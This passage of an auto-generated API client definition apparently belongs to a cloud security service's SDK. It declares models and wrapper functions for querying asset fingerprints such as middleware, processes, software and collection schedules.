  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: long(name='Name', description='The name of the middleware, database, or web service.

>  This parameter is deprecated. You can ignore it.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.

>  We recommend that you do not leave this parameter empty.', example='10'),
  pid?: string(name='Pid', description='The PID.', example='756'),
  port?: string(name='Port', description='The port that the process monitors.', example='68'),
  processStartedEnd?: long(name='ProcessStartedEnd', description='The timestamp when the process ends. Unit: milliseconds.', example='1641110965'),
  processStartedStart?: long(name='ProcessStartedStart', description='The timestamp when the process starts. Unit: milliseconds.', example='1641024565'),
  remark?: string(name='Remark', description='The search condition, such as a server name or a server IP address.

>  Fuzzy match is supported.', example='192.168'),
  scaName?: string(name='ScaName', description='The name of the asset fingerprint that you want to query.', example='openssl'),
  scaNamePattern?: string(name='ScaNamePattern', description='The name of the process.', example='open'),
  scaVersion?: string(name='ScaVersion', description='The version of the middleware, database, or web service.', example='1.0.2k'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='openssl'),
  searchInfoSub?: string(name='SearchInfoSub', description='The keyword of the subquery. You must specify this parameter based on the value of the **SearchItemSub** parameter.

*   If the **SearchItemSub** parameter is set to **port**, you must enter a port number.
*   If the **SearchItemSub** parameter is set to **pid**, you must enter a process ID (PID).
*   If the **SearchItemSub** parameter is set to **version**, you must enter the version of a database, middleware, or web service.
*   If the **SearchItemSub** parameter is set to **user**, you must enter a username.

>  The subquery is used to search for data of a specified database, middleware, or web service.', example='1.0.2k'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='name'),
  searchItemSub?: string(name='SearchItemSub', description='The type of the subquery. Valid values:

*   **port**
*   **pid**
*   **version**
*   **user**', example='version'),
  user?: string(name='User', description='The user who runs the process.', example='root'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-ab****'),
}

model DescribePropertyScaDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='software_library'),
      bizTypeDispaly?: string(name='BizTypeDispaly', description='The display name of the type of the middleware, database, or web service . Valid values:

*   System service
*   Software library
*   Container component
*   Database
*   Web container
*   JAR package
*   Web framework', example='System Service'),
      cmdline?: string(name='Cmdline', description='The command line of the process.', example='/sbin/dhclient -H iz2zeflhhbtk8gtxzt087az -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid eth0'),
      configPath?: string(name='ConfigPath', description='The path to the configuration file.', example='/etc/my.cnf'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
      createTimestamp?: long(name='CreateTimestamp', description='The latest collection timestamp, which indicates the last timestamp when Security Center collected the information about the middleware, database, or web service. Unit: milliseconds.', example='1597987834000'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server on which the middleware, database, or web service is run.', example='i-2zeclqj7ti****'),
      instanceName?: string(name='InstanceName', description='The name of the server on which the middleware, database, or web service is run.', example='Test01'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the middleware, database, or web service is run.', example='192.210.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the server on which the middleware, database, or web service is run.', example='47.42.XX.XX'),
      listenIp?: string(name='ListenIp', description='The IP address that the process monitors.', example='0.0.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The protocol of the traffic on which the process listens. Valid values:

*   **UDP**
*   **TCP**', example='UDP'),
      listenStatus?: string(name='ListenStatus', description='The listening status of the process. Valid values:

*   **NONE**: not listening
*   **LISTEN**: listening', example='NONE'),
      name?: string(name='Name', description='The name of the middleware, database, or web service.', example='openssl'),
      path?: string(name='Path', description='The path of the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      pid?: string(name='Pid', description='The PID.', example='756'),
      podName?: string(name='PodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
      port?: string(name='Port', description='The port of the middleware, database, or web service.', example='68'),
      ppid?: string(name='Ppid', description='The ID of the parent process.', example='1'),
      processStarted?: long(name='ProcessStarted', description='The timestamp when the process starts. Unit: milliseconds.', example='1596539788'),
      processUser?: string(name='ProcessUser', description='The name of the user who runs the process.', example='root'),
      proof?: string(name='Proof', description='The version verification information about the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      runtimeEnvVersion?: string(name='RuntimeEnvVersion', description='The version of the runtime environment.

>  The value of this parameter can be the Java Development Kit (JDK) version of the runtime environment for a Java process.', example='1.8.0_144'),
      type?: string(name='Type', description='The type of the middleware, database, or web service.', example='library'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the middleware, database, or web service is run.', example='uuid-02ebabe7-1c19-a****'),
      version?: string(name='Version', description='The version of the middleware, database, or web service.', example='1.0.2k'),
      webPath?: string(name='WebPath', description='The web directory.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='The details about the asset fingerprints returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F9146867-16C8-4AAB-BB4FB8C2A4'),
}

model DescribePropertyScaDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyScaDetailResponseBody(name='body'),
}

/**
 * @summary Queries middleware fingerprints.
 *
 * @param request DescribePropertyScaDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyScaDetailResponse
 */
async function describePropertyScaDetailWithOptions(request: DescribePropertyScaDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyScaDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pid)) {
    query['Pid'] = request.pid;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.processStartedEnd)) {
    query['ProcessStartedEnd'] = request.processStartedEnd;
  }
  if (!Util.isUnset(request.processStartedStart)) {
    query['ProcessStartedStart'] = request.processStartedStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.scaName)) {
    query['ScaName'] = request.scaName;
  }
  if (!Util.isUnset(request.scaNamePattern)) {
    query['ScaNamePattern'] = request.scaNamePattern;
  }
  if (!Util.isUnset(request.scaVersion)) {
    query['ScaVersion'] = request.scaVersion;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchInfoSub)) {
    query['SearchInfoSub'] = request.searchInfoSub;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  if (!Util.isUnset(request.searchItemSub)) {
    query['SearchItemSub'] = request.searchItemSub;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries middleware fingerprints.
 *
 * @param request DescribePropertyScaDetailRequest
 * @return DescribePropertyScaDetailResponse
 */
async function describePropertyScaDetail(request: DescribePropertyScaDetailRequest): DescribePropertyScaDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaDetailWithOptions(request, runtime);
}

model DescribePropertyScaItemRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

> If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='system_service'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='type'),
}

model DescribePropertyScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='docker_component'),
      count?: int32(name='Count', description='The number of servers on which the middleware is run.', example='23'),
      name?: string(name='Name', description='The name of the middleware.', example='kubelet'),
      typeDisplay?: string(name='TypeDisplay', description='The display name of the middleware type.', example='Docker Component'),
    }
  ](name='PropertyItems', description='An array that consists of the information about middleware fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
}

model DescribePropertyScaItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyScaItemResponseBody(name='body'),
}

/**
 * @summary Queries middleware fingerprints.
 *
 * @param request DescribePropertyScaItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyScaItemResponse
 */
async function describePropertyScaItemWithOptions(request: DescribePropertyScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries middleware fingerprints.
 *
 * @param request DescribePropertyScaItemRequest
 * @return DescribePropertyScaItemResponse
 */
async function describePropertyScaItem(request: DescribePropertyScaItemRequest): DescribePropertyScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaItemWithOptions(request, runtime);
}

model DescribePropertyScaProcessDetailRequest {
  bizType?: string(name='BizType', description='The type of the application process. Default value: **java**. Valid values:

*   **java**: Java process.
*   **php**: PHP process.', example='java'),
  cmdline?: string(name='Cmdline', description='The startup parameter.

>  This parameter supports only prefix queries. Fuzzy match is not supported.', example='java -jar'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 10. If you leave this parameter empty, 10 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='10'),
  pid?: string(name='Pid', description='The process ID.

>  Only exact match is supported.', example='756'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the public IP address, private IP address, or name of the server. Fuzzy match is supported.', example='10.167.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> 

*   You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

*   Only exact match is supported.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
}

model DescribePropertyScaProcessDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline', description='The command line of the process.', example='java -Xms128m -Xmx512m -DNACOS_URL=http://10.184.XX.XX:8848 -DNACOS_NAMESPACE=iam-sit -jar /opt/service/xxl-job/xxl-job-admin-2.3.0.jar'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp at which the last asset fingerprint collection is performed. Unit: milliseconds.', example='1597987834000'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.26.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      name?: string(name='Name', description='The name of the process.', example='java'),
      pid?: string(name='Pid', description='The ID of the process.', example='522'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='The processes collected by the asset fingerprints feature.'),
  requestId?: string(name='RequestId', description='The request ID.', example='ADE57832-9666-511C-9A80-B87DE2E8****'),
}

model DescribePropertyScaProcessDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyScaProcessDetailResponseBody(name='body'),
}

/**
 * @summary Queries the Java processes that are collected by the asset fingerprints feature of Security Center in your assets.
 *
 * @param request DescribePropertyScaProcessDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyScaProcessDetailResponse
 */
async function describePropertyScaProcessDetailWithOptions(request: DescribePropertyScaProcessDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyScaProcessDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pid)) {
    query['Pid'] = request.pid;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaProcessDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the Java processes that are collected by the asset fingerprints feature of Security Center in your assets.
 *
 * @param request DescribePropertyScaProcessDetailRequest
 * @return DescribePropertyScaProcessDetailResponse
 */
async function describePropertyScaProcessDetail(request: DescribePropertyScaProcessDetailRequest): DescribePropertyScaProcessDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaProcessDetailWithOptions(request, runtime);
}

model DescribePropertyScheduleConfigRequest {
  type?: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website

This parameter is required.', example='scheduler_autorun_period'),
}

model DescribePropertyScheduleConfigResponseBody = {
  config?: string(name='Config', description='The configuration time. Unit: hours.

>  A value **0** indicates that asset fingerprint collection is disabled for this type of asset.', example='3'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyScheduleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertyScheduleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of scheduled tasks of asset fingerprint collection.
 *
 * @param request DescribePropertyScheduleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertyScheduleConfigResponse
 */
async function describePropertyScheduleConfigWithOptions(request: DescribePropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribePropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of scheduled tasks of asset fingerprint collection.
 *
 * @param request DescribePropertyScheduleConfigRequest
 * @return DescribePropertyScheduleConfigResponse
 */
async function describePropertyScheduleConfig(request: DescribePropertyScheduleConfigRequest): DescribePropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScheduleConfigWithOptions(request, runtime);
}

model DescribePropertySoftwareDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1'),
  extend?: string(name='Extend', description='Specifies whether fuzzy search by software name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='1'),
  installTimeEnd?: long(name='InstallTimeEnd', description='The timestamp generated when the software update ends. Unit: milliseconds.', example='1650012695000'),
  installTimeStart?: long(name='InstallTimeStart', description='The timestamp generated when the software update starts. Unit: milliseconds.', example='1649321495000'),
  name?: string(name='Name', description='The name of the software.', example='kernel'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10'),
  path?: string(name='Path', description='The installation path of the software.', example='/etc/test'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='192.168.XX.XX'),
  softwareVersion?: string(name='SoftwareVersion', description='The version of the software.', example='3.10.0'),
  uuid?: string(name='Uuid', description='The UUID of the server.', example='50d213b4-3a35-427a-b8a5-****'),
}

model DescribePropertySoftwareDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp generated when the last asset fingerprint collection is performed. Unit: milliseconds.', example='1649149566000'),
      installTime?: string(name='InstallTime', description='The time at which the software is installed.', example='2022-04-07 10:54:49'),
      installTimeDt?: long(name='InstallTimeDt', description='The timestamp generated when the software is installed. Unit: milliseconds.', example='1649066826000'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP addresses of the server.', example='192.168.XX.XX'),
      name?: string(name='Name', description='The name of the software.', example='aaa_base'),
      path?: string(name='Path', description='The installation path of the software.', example='/etc/test'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      version?: string(name='Version', description='The version of the software.', example='3.10.0'),
    }
  ](name='Propertys', description='The details of the software asset.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6AEE7412-0065-1135-B790-AE2C38BA68FB'),
}

model DescribePropertySoftwareDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertySoftwareDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details of a software asset.
 *
 * @param request DescribePropertySoftwareDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertySoftwareDetailResponse
 */
async function describePropertySoftwareDetailWithOptions(request: DescribePropertySoftwareDetailRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.installTimeEnd)) {
    query['InstallTimeEnd'] = request.installTimeEnd;
  }
  if (!Util.isUnset(request.installTimeStart)) {
    query['InstallTimeStart'] = request.installTimeStart;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.softwareVersion)) {
    query['SoftwareVersion'] = request.softwareVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a software asset.
 *
 * @param request DescribePropertySoftwareDetailRequest
 * @return DescribePropertySoftwareDetailResponse
 */
async function describePropertySoftwareDetail(request: DescribePropertySoftwareDetailRequest): DescribePropertySoftwareDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareDetailWithOptions(request, runtime);
}

model DescribePropertySoftwareItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query.', example='true'),
  name?: string(name='Name', description='The name of the software that you want to query.', example='test'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
}

model DescribePropertySoftwareItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='2'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5037'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers on which the software is installed.', example='23'),
      name?: string(name='Name', description='The name of the software.', example='aaa_base'),
    }
  ](name='PropertyItems', description='An array that consists of the software assets returned.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
}

model DescribePropertySoftwareItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribePropertySoftwareItemResponseBody(name='body'),
}

/**
 * @summary Queries information about all software assets.
 *
 * @param request DescribePropertySoftwareItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribePropertySoftwareItemResponse
 */
async function describePropertySoftwareItemWithOptions(request: DescribePropertySoftwareItemRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about all software assets.
 *
 * @param request DescribePropertySoftwareItemRequest
 * @return DescribePropertySoftwareItemResponse
 */
async function describePropertySoftwareItem(request: DescribePropertySoftwareItemRequest): DescribePropertySoftwareItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareItemWithOptions(request, runtime);
}

model DescribePropertyTypeScaItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
}

model DescribePropertyTypeScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
